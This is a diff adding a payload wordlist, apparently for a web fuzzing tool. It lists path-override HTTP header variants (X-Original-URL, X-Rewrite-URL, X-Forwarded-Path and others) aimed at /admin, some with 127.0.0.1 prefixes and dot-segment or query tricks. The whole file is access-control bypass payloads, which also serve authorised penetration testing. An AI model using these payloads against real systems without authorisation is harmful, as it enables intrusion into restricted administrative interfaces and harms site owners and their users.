@@ -1,0 +1,46 @@
+# ================================================================
+# Path override header variations
+# {path} -> /admin
+# {path_no_slash} -> admin
+# ================================================================
+
+# --- X-Original-URL variants ---
+X-Original-URL: {path}
+X-Original-URL: {path_no_slash}
+X-Original-URL: http://127.0.0.1{path}
+X-Original-URL: https://127.0.0.1{path}
+X-Original-URL: //127.0.0.1{path}
+X-Original-URL: /.{path}
+X-Original-URL: {path}/..
+X-Original-URL: {path}?test=1
+X-Original-URL: {path}??
+X-Original-URL: {path}/
+
+# --- X-Rewrite-URL variants ---
+X-Rewrite-URL: {path}
+X-Rewrite-URL: {path_no_slash}
+X-Rewrite-URL: http://127.0.0.1{path}
+X-Rewrite-URL: https://127.0.0.1{path}
+X-Rewrite-URL: //127.0.0.1{path}
+X-Rewrite-URL: /.{path}
+X-Rewrite-URL: {path}/..
+
+# --- X-Override-URL variants ---
+X-Override-URL: {path}
+X-Override-URL: http://127.0.0.1{path}
+X-Override-URL: //127.0.0.1{path}
+X-Override-URL: /.{path}
+
+# --- X-Forwarded-Path variants ---
+X-Forwarded-Path: {path}
+X-Forwarded-Path: http://127.0.0.1{path}
+X-Forwarded-Path: //127.0.0.1{path}
+
+# --- X-Original-URI variants ---
+X-Original-URI: {path}
+X-Original-URI: http://127.0.0.1{path}
+X-Original-URI: //127.0.0.1{path}
+
+# --- Additional routing headers ---
+X-HTTP-DestinationURL: http://127.0.0.1{path}
+X-Forwarded-Prefix: {path}
